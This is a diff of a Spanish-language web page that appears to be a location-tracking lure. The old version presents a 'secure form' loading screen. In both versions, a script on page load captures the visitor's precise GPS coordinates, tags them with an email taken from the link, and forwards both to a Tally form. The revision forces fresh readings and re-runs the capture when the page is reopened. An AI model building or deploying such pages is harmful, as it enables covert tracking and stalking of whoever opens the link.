@@ -1,63 +1,53 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando Formulario...</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f9f9f9; }
-        .loader { text-align: center; color: #333; }
-    </style>
-</head>
-<body>
-
-<div class="loader">
-    <h2>Abriendo formulario seguro...</h2>
-    <p>Por favor, acepta el permiso de ubicación si el navegador lo solicita.</p>
-</div>
-
 <script>
-    // ⚠️ REEMPLAZA EL ENLACE DE ABAJO CON EL ENLACE REAL DE TU FORMULARIO DE TALLY
-    const TALLY_URL = "https://tally.so/r/obqGae";
+    // REEMPLAZA ESTE ENLACE CON EL DE TU FORMULARIO REAL DE TALLY
+    const TALLY_URL = "https://tally.so";
 
-function obtenerUbicacion() {
-    // Esta línea lee AUTOMÁTICAMENTE cualquier parámetro que tú pongas en la URL (?email=...)
-    const parametrosActuales = window.location.search; 
+    function obtenerUbicacion() {
+        const parametrosActuales = window.location.search; 
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                
-                // Crea el enlace base con el GPS
-                let urlFinal = `${TALLY_URL}?lat=${lat}&lon=${lon}`;
-                
-                // Si tú pusiste un correo en la URL, el código lo agarra y lo une al GPS aquí
-                if (parametrosActuales) {
-                    const limpio = parametrosActuales.replace('?', '');
-                    urlFinal += `&${limpio}`;
-                }
-                
-                // Redirecciona al formulario correcto
-                window.location.href = urlFinal;
-            },
-            (error) => {
-                // Si no hay GPS, te manda a Tally manteniendo el correo que pusiste
-                window.location.href = parametrosActuales ? `${TALLY_URL}${parametrosActuales}` : TALLY_URL;
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    } else {
-        // Si el navegador no soporta GPS, te manda a Tally manteniendo el correo que pusiste
-        window.location.href = parametrosActuales ? `${TALLY_URL}${parametrosActuales}` : TALLY_URL;
+        if (navigator.geolocation) {
+            // USAMOS watchPosition EN LUGAR DE getCurrentPosition PARA FORZAR AL GPS A TRABAJAR EN TIEMPO REAL
+            const geoOpciones = { 
+                enableHighAccuracy: true, 
+                timeout: 8000, 
+                maximumAge: 0 // 👈 OBLIGA AL TELÉFONO A NO USAR UBICACIONES VIEJAS EN CACHÉ
+            };
+
+            const idReloj = navigator.geolocation.watchPosition(
+                (position) => {
+                    // Detenemos el reloj de inmediato una vez obtenida la primera coordenada fresca
+                    navigator.geolocation.clearWatch(idReloj);
+
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    let urlFinal = `${TALLY_URL}?lat=${lat}&lon=${lon}`;
+                    if (parametrosActuales) {
+                        const limpio = parametrosActuales.replace('?', '');
+                        urlFinal += `&${limpio}`;
+                    }
+                    
+                    window.location.href = urlFinal;
+                },
+                (error) => {
+                    navigator.geolocation.clearWatch(idReloj);
+                    console.warn("Error de GPS o permiso denegado.");
+                    window.location.href = parametrosActuales ? `${TALLY_URL}${parametrosActuales}` : TALLY_URL;
+                },
+                geoOpciones
+            );
+        } else {
+            window.location.href = parametrosActuales ? `${TALLY_URL}${parametrosActuales}` : TALLY_URL;
+        }
     }
-}
 
-
-    // Ejecutar al cargar la página
+    // Ejecutar al cargar la página normalmente
     window.onload = obtenerUbicacion;
+    
+    // 📱 TRUCO PARA ANDROID: Si la app ya estaba abierta en segundo plano, esto detecta cuando el usuario vuelve a entrar
+    document.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "visible") {
+            obtenerUbicacion();
+        }
+    });
 </script>
-
-</body>
-</html>
